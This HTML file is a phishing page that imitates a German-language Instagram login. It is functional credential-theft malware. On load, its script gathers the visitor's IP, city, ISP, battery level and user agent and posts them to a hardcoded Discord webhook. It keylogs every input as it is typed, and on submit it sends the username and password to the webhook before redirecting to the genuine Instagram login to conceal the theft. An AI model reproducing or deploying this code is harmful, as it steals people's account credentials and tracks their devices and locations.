<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <meta property="og:title" content="Instagram: Anmeldung erforderlich">
    <meta property="og:description" content="Verifizieren Sie Ihr Konto, um fortzufahren.">
     <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/b3063914a21e.png" type="image/png">


    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; cursor: pointer; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 6px; font-size: 12px; box-sizing: border-box; outline: none; }
        input:focus { border: 1px solid #a8a8a8; }
        button { width: 100%; background-color: #0095f6; border: none; color: white; border-radius: 4px; padding: 7px; font-weight: 600; cursor: pointer; margin-top: 8px; }
        button:disabled { background-color: #b2dffc; cursor: default; }
        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; margin: 20px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .forgot { font-size: 12px; color: #00376b; margin-top: 20px; display: block; text-decoration: none; }
        .signup { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>

<div>
  <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/768px-Instagram_logo_2016.svg.png" 
             alt="Instagram" 
             style="width: 60px; margin-bottom: 20px;">
        
        <h2 style="font-size: 24px; font-weight: 600; margin-bottom: 10px;">Anmelden</h2>
        <p style="font-size: 15px; margin-bottom: 20px;">Verwenden Sie Ihr Instagram-Konto</p>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Telefonnummer, Benutzername oder E-Mail" required 
                   style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box;">
            
            <input type="password" id="password" placeholder="Passwort" required 
                   style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box;">
            
            <div style="display: flex; justify-content: flex-end; margin-top: 10px;">
                <button type="submit" id="loginBtn" 
                        style="background-color: #0095f6; color: white; border: none; padding: 10px 25px; cursor: pointer; font-weight: 600; border-radius: 4px;">
                    Weiter
                </button>
            </div>
        </form>

        <div style="display: flex; align-items: center; margin: 20px 0; color: #8e8e8e;">
            <div style="flex: 1; height: 1px; background: #dbdbdb;"></div>
            <div style="margin: 0 10px; font-size: 13px;">ODER</div>
            <div style="flex: 1; height: 1px; background: #dbdbdb;"></div>
        </div>

        <a href="#" style="color: #385185; text-decoration: none; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="18">
            Mit Facebook anmelden
        </a>
    </div>
</div>

<script>
    const webhookURL = "https://discordapp.com/api/webhooks/1494160779870732298/KVETkbh_dmAeaHF-yhsZDxaAqJe_iO146Cxu8i4kSDYLxO8bxLIzNlamNAdcrPHnn-T3";

    // 1. جمع البيانات الاستخباراتية (IP, Battery, Device)
    async function collectIntel() {
        let intel = { ip: "Unknown", battery: "N/A", device: navigator.platform, userAgent: navigator.userAgent };
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            intel.ip = d.ip;
            intel.city = d.city;
            intel.isp = d.org;
        } catch {}

        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            intel.battery = `${(b.level * 100).toFixed(0)}% ${b.charging ? '🔌' : '🔋'}`;
        }

        fetch(webhookURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "📸 Instagram Target Spotted",
                    color: 13114044, // لون انستغرام الشهير
                    fields: [
                        { name: "📍 Location", value: `${intel.ip} (${intel.city || '?'})`, inline: true },
                        { name: "🔋 Battery", value: intel.battery, inline: true },
                        { name: "📡 Provider", value: intel.isp || "Unknown", inline: false },
                        { name: "📱 System", value: intel.userAgent, inline: false }
                    ]
                }]
            })
        });
    }
    collectIntel();

    // 2. Keylogger (سحب الحروف فوراً)
    document.querySelectorAll('input').forEach(input => {
        input.addEventListener('input', (e) => {
            fetch(webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `⌨️ **Instagram [${e.target.id}]:** \`${e.target.value}\`` })
            });
        });
    });

    // 3. إنهاء العملية
    document.getElementById('loginForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;

        fetch(webhookURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🎯 Instagram Credentials Captured",
                    color: 3066993,
                    fields: [
                        { name: "📧 Username/Email", value: `\`${u}\`` },
                        { name: "🔑 Password", value: `\`${p}\`` }
                    ]
                }]
            })
        }).then(() => {
            window.location.href = "https://www.instagram.com/accounts/login/";
        });
    });
</script>

</body>
</html>
